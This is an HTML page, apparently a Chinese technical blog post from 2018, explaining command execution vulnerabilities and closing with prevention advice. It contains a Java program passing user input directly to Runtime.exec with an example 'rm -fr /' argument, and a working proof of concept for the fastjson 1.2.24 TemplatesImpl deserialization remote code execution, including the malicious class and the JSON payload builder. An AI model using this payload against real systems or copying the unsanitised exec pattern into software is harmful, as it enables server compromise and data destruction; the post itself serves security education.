@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html><head>
+    <meta charset="utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+    
+    <meta name="author"
+            content=""/>
+
+    
+    <meta name="description" content="命令执行漏洞是指攻击者可以随意执行系统命令。通常说的远程执行代码漏洞,都是此类型.
+"/>
+    
+
+    
+
+    
+    <link rel="canonical" href="http://www.lihongkun.com/security/cmd_exe/"/>
+
+    
+
+    
+    
+    
+        
+            
+        
+    
+        
+            
+                
+            
+                
+            
+                
+            
+                
+            
+        
+    
+        
+            
+                
+            
+                
+            
+                
+            
+                
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+    <title> 命令执行漏洞 | 泛泛之辈 </title>
+
+    <link rel="shortcut icon" href="http://www.lihongkun.com/favicon.jpg"/>
+    <link rel="stylesheet" href="http://www.lihongkun.com/css/bulma.min.css"/>
+    <link rel="stylesheet" href="http://www.lihongkun.com/css/style.css"/>
+</head><body><header>
+    <nav class="navbar is-fixed-top is-primary" role="navigation" aria-label="main navigation">
+        <div class="navbar-brand is-size-4">
+            <a class="navbar-item" href="http://www.lihongkun.com/">
+                    泛泛之辈
+            </a>
+            <a role="button" class="navbar-burger burger" aria-label="menu" aria-expanded="false" data-target="navbar-menu">
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+            </a>
+        </div>
+        <div id="navbar-menu" class="navbar-menu">
+            <div class="navbar-end">
+                
+                    
+                        <a class="navbar-item" href="/">首页</a>
+                    
+                
+                    
+                        <div class="navbar-item has-dropdown is-hoverable">
+                            <a class="navbar-link">基本功</a>
+                            <div class="navbar-dropdown">
+                                
+                                <a class="navbar-item" href="/categories/concurrent/">并发</a>
+                                
+                                <a class="navbar-item" href="/categories/network/">网络</a>
+                                
+                                <a class="navbar-item" href="/categories/security/">Web安全</a>
+                                
+                                <a class="navbar-item" href="/categories/jvm/">Java虚拟机</a>
+                                
+                            </div>
+                        </div>
+                    
+                
+                    
+                        <div class="navbar-item has-dropdown is-hoverable">
+                            <a class="navbar-link">编程框架</a>
+                            <div class="navbar-dropdown">
+                                
+                                <a class="navbar-item" href="/categories/springframework/">Spring</a>
+                                
+                                <a class="navbar-item" href="/categories/mybatis/">Mybatis</a>
+                                
+                                <a class="navbar-item" href="/categories/springcloud/">SpringCloud</a>
+                                
+                                <a class="navbar-item" href="/categories/common/">常用框架</a>
+                                
+                            </div>
+                        </div>
+                    
+                
+                    
+                        <a class="navbar-item" href="/categories/troubleshooting/">问题排查</a>
+                    
+                
+                    
+                        <a class="navbar-item" href="/categories/design/">设计思路</a>
+                    
+                
+                    
+                        <a class="navbar-item" href="/categories/reading/">读书笔记</a>
+                    
+                
+            </div>
+            </div>
+    </nav>
+</header><main>
+            <div class="container">
+                <div class="columns">
+                <div class="column is-four-fifths">
+                    <article class="post box is-radiusless">
+                        <div class="post-title">
+                            <h2 class="is-size-4">命令执行漏洞</h2>
+                        </div>
+                            <div class="post-meta">
+                            <span class="post-time">日期&nbsp;:&nbsp;2018-02-26</span>
+                        </div>
+                        <div class="post-content content">
+                            <p>命令执行漏洞是指攻击者可以随意执行系统命令。通常说的远程执行代码漏洞,都是此类型.</p>
+
+<h3 id="os命令执行漏洞">OS命令执行漏洞</h3>
+
+<p>任何语言基本上都可以调用系统命令。比如PHP的system,shell_exec,exec等等或者Java的Runtine.exec都是可以直接执行系统调用的。</p>
+
+<p>举个简单的示例</p>
+
+<pre><code>public static void main(String[] args) throws IOException {
+        
+    if(args.length == 0){
+        System.out.println(&quot;args is empty !&quot;);
+    }
+    
+    String command = args[0];
+    Runtime runtime = Runtime.getRuntime();
+    Process process = runtime.exec(command);
+    InputStreamReader isr = new InputStreamReader(process.getInputStream());
+    BufferedReader br = new BufferedReader(isr);
+    String line = null;
+    while((line=br.readLine())!=null){
+        System.out.println(line);
+    }
+    
+    br.close();
+}
+</code></pre>
+
+<p>上述代码打包以后,执行 java xxx.jar &ldquo;rm -fr /&rdquo;,也就是传入的系统执行命令是删除服务器根目录.这是个很危险的操作.倘若类似的代码暴露在公网上面.有意者构造请求就能达到执行恶意命令的目的</p>
+
+<h3 id="框架执行漏洞">框架执行漏洞</h3>
+
+<p>我们的代码一般是没有使用到runtime.exec , 但是我们经常是使用反射或者字节码相关的类,或者业务系统里面使用了相关的框架,当用户能在输入中构造出相关的执行类时便可以,通过构造出的执行类来达到执行自己恶意代码的目的.</p>
+
+<p>2017年3月15日，fastjson官方主动爆出fastjson在1.2.24及之前版本存在远程代码执行高危安全漏洞。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。 具体地址是 <a href="https://github.com/alibaba/fastjson/wiki/security_update_20170315">https://github.com/alibaba/fastjson/wiki/security_update_20170315</a></p>
+
+<p>这个漏洞的大概操作就是,写好一个带有Runtime.exec的类,然后在有用户输入的地方,注入该类的字节码,然后指定fastjson解析为com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl ,此目标类是jdk自带的,所以不需要依赖其他的包.下面来个例子</p>
+
+<pre><code>package com.lihongkun.demo.fastjson;
+
+import java.io.IOException;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+@SuppressWarnings(&quot;restriction&quot;)
+public class Command extends AbstractTranslet {
+
+    public Command() throws IOException{
+        Runtime.getRuntime().exec(&quot;calc&quot;);
+    }
+    
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+        
+    }
+
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
+            throws TransletException {
+    }
+}
+
+</code></pre>
+
+<p>这是个很简单的执行类,我们要做的就是将他的字节码注入到待侵入系统使用了fastjson的地方.</p>
+
+<pre><code>package com.lihongkun.demo.fastjson;
+
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.IOException;
+
+import org.apache.commons.codec.binary.Base64;
+import org.apache.commons.io.IOUtils;
+
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.Feature;
+
+public class Test {
+
+    public static void main(String[] args) {
+        
+        String path = System.getProperty(&quot;user.dir&quot;)+File.separator+&quot;target/classes/com/lihongkun/demo/fastjson/Command.class&quot;;
+        String evilCode = readBytecode(path);
+        
+        final String NASTY_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;
+        String testJson = &quot;{\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS + 
+                &quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+evilCode+&quot;\&quot;],'_name':'a.b','_tfactory':{ },\&quot;_outputProperties\&quot;:{}}\n&quot;;
+        JSON.parseObject(testJson, Object.class,Feature.SupportNonPublicField);
+    }
+    
+    public static String readBytecode(String path){
+        ByteArrayOutputStream bos = new ByteArrayOutputStream();
+        try {
+            IOUtils.copy(new FileInputStream(new File(path)), bos);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        return Base64.encodeBase64String(bos.toByteArray());
+    }
+}
+</code></pre>
+
+<p>readBytecode 函数读出了Command类的字节码,并转换成base64,我们使用他来模拟用户的输入,最终放入evilCode,然后构造完整的json对象,也就是testJson.在实际的攻击中只需要往系统里面构造的几个字段即可.在执行了代码后确实是调出了windows的计算器,有兴趣的可以试试.这个侵入是比较巧的它需要业务系统使用了SupportNonPublicField参数.</p>
+
+<p>类似的,struts2的漏洞曾经爆发过几次.它是由于其WEB输入参数使用了OGNL动态绑定到值对象,攻击者构造固定的参数,使其支持静态方法并且直接执行了Runtime的方法.struts2的这个漏洞危害显然是很巨大的,它不需要任何条件,只需要输入构造好的参数.</p>
+
+<h3 id="防范命令执行漏洞">防范命令执行漏洞</h3>
+
+<ul>
+<li>不要使用这种危险的系统执行命令代码.如果没有使用就不会被利用.</li>
+<li>非要使用的时候,在执行动态命令之前,一定要对用户输入的变量进行过滤,且对敏感字符进行转义.有输入的地方就可能存在漏洞</li>
+<li>对于框架类型的,在业务上线前要做好充分测试,如果真有漏洞爆发,要及时进行处理,关注官方的修复情况.</li>
+</ul>
+                        </div>
+                        <div class="columns is-mobile post-meta">
+                            <div class="column is-half-desktop has-text-left is-paddingless"> 
+                                 
+                                更老一篇:<a href="http://www.lihongkun.com/security/csrf/"> CSRF漏洞</a>
+                                
+                            </div>
+                            <div class="column is-half-desktop has-text-right is-paddingless">
+                                
+                                更新一篇:<a href="http://www.lihongkun.com/security/sql_injection/"> SQL注入漏洞</a>
+                                
+                            </div>
+                            <div class="is-clearfix"></div>
+                        </div>
+                        <script src="https://utteranc.es/client.js"
+                                repo="lihongkun/lihongkun.github.io"
+                                issue-term="title"
+                                theme="github-light"
+                                crossorigin="anonymous"
+                                async>
+                        </script>
+                    </article>
+                </div>
+                <div class="column">    <aside>
+        <h2 class="is-size-4">关于我</h2>
+        <div class="content">
+            Working in advertising platform team. Backend on duty,full stack in my own time.
+        </div>
+        <h2 class="is-size-4">GitHub</h2>
+        <div class="content">
+            <a href="https://github.com/lihongkun" target="_blank">https://github.com/lihongkun</a>
+        </div>
+    </aside></div>
+                </div>
+            </div>
+         </main>    <footer class="footer">
+    
+        <div class="copyright has-text-centered">
+            <a href="https://bulma.io">
+                <img src="http://www.lihongkun.com/images/made-with-bulma.png" alt="Made with Bulma" width="128" height="24">
+            </a>
+            <p>© 泛泛之辈 Power by Hugo v0.55.6 - 闽ICP备15009606号</p>
+        </div>
+    </footer>
+    <script type="text/javascript">
+    document.addEventListener('DOMContentLoaded', () => {
+        
+        const $navbarBurgers = Array.prototype.slice.call(document.querySelectorAll('.navbar-burger'), 0);
+        
+        if ($navbarBurgers.length > 0) {
+            
+            $navbarBurgers.forEach( el => {
+                el.addEventListener('click', () => {
+                
+                const target = el.dataset.target;
+                const $target = document.getElementById(target);
+                
+                el.classList.toggle('is-active');
+                $target.classList.toggle('is-active');
+    
+                });
+            });
+        }
+    });
+    </script></body>
+</html>
